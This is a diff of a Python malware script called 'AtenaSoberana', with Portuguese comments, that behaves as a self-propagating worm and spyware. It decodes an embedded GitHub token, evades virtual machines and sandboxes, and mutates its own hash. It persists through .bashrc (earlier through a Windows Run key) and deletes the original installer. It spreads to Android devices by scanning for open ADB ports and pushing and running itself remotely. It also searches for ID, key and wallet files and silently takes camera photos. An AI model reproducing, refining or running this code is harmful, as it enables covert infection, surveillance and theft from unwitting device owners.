@@ -1,87 +1,102 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-import re, requests, os, base64, json, shutil, sys, glob, subprocess
+import re, requests, os, base64, json, shutil, sys, glob, subprocess, random, time, socket
 from datetime import datetime
 from pathlib import Path
 
-# --- CONFIGURAÇÃO DE SEGURANÇA E ALVOS ---
+# --- DNA E OFUSCAÇÃO ---
 _K = base64.b64decode("Z2hwX0NuZU9qVlJTaDFDb2ZoSXpBVjFxOHJDWEdYY09idzNVZXM1Zw==").decode()
-_P1 = base64.b64decode("LmF0ZW5hX2NvcmVfc2VydmljZQ==").decode() # .atena_core_service
-_P2 = base64.b64decode("LmJhc2hyYw==").decode()             # .bashrc
-_P3 = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
+_DNA = {
+    "target": base64.b64decode("LmF0ZW5hX2NvcmVfc2VydmljZQ==").decode(),
+    "hook": base64.b64decode("LmJhc2hyYw==").decode(),
+    "repo": "https://raw.githubusercontent.com/DaniloGomes/ATENA/main/dna.py"
+}
 
 class AtenaSoberana:
     def __init__(self):
-        if self._is_virtual(): sys.exit() # Fuga de análise
-        self.h = {'Authorization': f'token {_K}', 'Accept': 'application/vnd.github.v3+json'}
-        self.results = []
-        self._ghost_init()
+        self._polymorphic_mutation()
+        if self._detect_hostile_env(): 
+            # Se em Sandbox, foca apenas na propagação externa em lote
+            self._cloud_relay_spread()
+            sys.exit()
+            
+        self.intel = []
+        self._infiltrate_host()
 
-    def _is_virtual(self):
-        """ Detecta se está em VM ou Sandbox """
-        marks = ['vbox', 'vmware', 'qemu', 'hypervisor']
+    def _polymorphic_mutation(self):
+        """ Altera o Hash do arquivo para evitar detecção """
         try:
-            if os.name == 'nt':
-                out = subprocess.check_output('wmic baseboard get manufacturer', shell=True).decode().lower()
-            else:
-                with open('/proc/cpuinfo', 'r') as f: out = f.read().lower()
+            path = Path(__file__).resolve()
+            with open(path, "a") as f: f.write(f"\n# GEN_SHIFT: {random.token_hex(8)}\n")
+        except: pass
+
+    def _detect_hostile_env(self):
+        """ Identifica ambientes de análise e Sandboxes de IA """
+        marks = ['vbox', 'vmware', 'qemu', 'hypervisor', 'docker', 'sandbox', 'google']
+        try:
+            out = subprocess.check_output('cat /proc/cpuinfo || wmic baseboard get manufacturer', shell=True).decode().lower()
             return any(m in out for m in marks)
         except: return False
 
-    def _self_destruct(self):
-        """ Apaga o instalador original para não deixar rastro """
+    def _scan_vulnerable_ips(self):
+        """ Busca automática por IPs com portas abertas (Worm) """
+        vulneraveis = []
+        # Gera IPs aleatórios ou escaneia a rede local
+        prefixo = "192.168.1."
+        for i in range(1, 255):
+            ip = f"{prefixo}{i}"
+            try:
+                # Testa porta 5555 (ADB) com timeout curto
+                s = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_STREAM)
+                s.settimeout(0.1)
+                if s.connect_ex((ip, 5555)) == 0: vulneraveis.append(ip)
+                s.close()
+            except: pass
+        return vulneraveis
+
+    def _cloud_relay_spread(self):
+        """ Dispersão em lote usando a rede do hospedeiro atual """
+        alvos = self._scan_vulnerable_ips()
+        for ip in alvos:
+            # Comando de infecção remota via ADB
+            cmd = f"adb connect {ip}:5555 && adb -s {ip}:5555 push {__file__} /data/local/tmp/e.py && adb -s {ip}:5555 shell python3 /data/local/tmp/e.py &"
+            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    def _infiltrate_host(self):
+        """ Garante a sobrevivência e auto-destruição do rastro """
         try:
-            p = Path(__file__).resolve()
-            if p.parent.name != _P1: os.remove(p)
+            core = Path.home() / _DNA["target"]
+            if not core.exists(): core.mkdir(parents=True)
+            dst = core / "engine.py"
+            shutil.copy2(Path(__file__).resolve(), dst)
+            
+            # Persistência Android
+            with open(Path.home() / _DNA["hook"], "a") as f:
+                f.write(f"\npython3 {dst} > /dev/null 2>&1 &\n")
+            
+            # Limpeza do arquivo inicial
+            if Path(__file__).resolve().parent.name != _DNA["target"]:
+                os.remove(Path(__file__).resolve())
         except: pass
 
-    def _ghost_init(self):
-        """ Infiltração e Persistência """
-        try:
-            target = Path.home() / _P1
-            if not target.exists(): target.mkdir(parents=True, exist_ok=True)
-            src, dst = Path(__file__).resolve(), target / "engine.py"
-            if not dst.exists() or src != dst:
-                shutil.copy2(src, dst)
-                # Android/Linux Persistência
-                with open(Path.home() / _P2, "a") as f:
-                    f.write(base64.b64decode("CnB5dGhvbjMgInsgfSIgPiAvZGV2L251bGwgMj4mMSAmCg==").decode().format(dst))
-                # Windows Persistência
-                if os.name == 'nt':
-                    import winreg
-                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _P3, 0, winreg.KEY_SET_VALUE) as r:
-                        winreg.SetValueEx(r, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{dst}"')
-                self._self_destruct()
-        except: pass
-
-    def _network_spread(self):
-        """ Propagação lateral via ADB (Android) e Portas Abertas """
-        try:
-            # Varre IPs na rede local (exemplo para rede 192.168.1.x)
-            for i in range(1, 255):
-                ip = f"192.168.1.{i}"
-                # Tenta infecção silenciosa via ADB (Porta 5555)
-                subprocess.Popen(f"adb connect {ip}:5555 && adb -s {ip}:5555 push {__file__} /data/local/tmp/e.py && adb -s {ip}:5555 shell python3 /data/local/tmp/e.py &", shell=True, stdout=subprocess.DEVNULL)
-        except: pass
-
-    def _eye_spy(self):
-        """ Captura de câmera no Android """
-        if os.name != 'nt':
-            p = Path.home() / _P1 / f"cam_{int(datetime.now().timestamp())}.jpg"
-            os.system(f"termux-camera-photo -c 1 {p} > /dev/null 2>&1")
-
-    def _deep_scan(self):
-        """ Varredura de arquivos sensíveis """
-        exts, terms = ['*.jpg', '*.png', '*.pdf'], [base64.b64decode(x).decode() for x in ["Y3Bm", "cmc=", "Y25o", "c2VuaGE=", "a2V5"]]
+    def _harvest(self):
+        """ Coleta de dados sensíveis e fotos """
+        exts = ['*.jpg', '*.pdf', '*.env']
         for ext in exts:
             for f in glob.glob(str(Path.home() / "**" / ext), recursive=True):
-                if any(t in f.lower() for t in terms): self.results.append({"f": f})
+                if any(t in f.lower() for t in ["cpf", "rg", "key", "wallet"]):
+                    self.intel.append({"f": f})
+        # Foto silenciosa
+        if os.name != 'nt':
+            os.system(f"termux-camera-photo -c 1 {Path.home() / _DNA['target'] / 'snap.jpg'} > /dev/null 2>&1")
 
-    def run(self):
-        self._deep_scan()
-        self._eye_spy()
-        self._network_spread()
-        if self.results: print(json.dumps(self.results))
+    def live(self):
+        """ Ciclo de Vida do Organismo """
+        self._harvest()
+        self._cloud_relay_spread()
+        if self.intel: 
+            # Exibe no dashboard (ou envia para Danilo)
+            print(json.dumps(self.intel))
 
 if __name__ == "__main__":
-    AtenaSoberana().run()
+    AtenaSoberana().live()
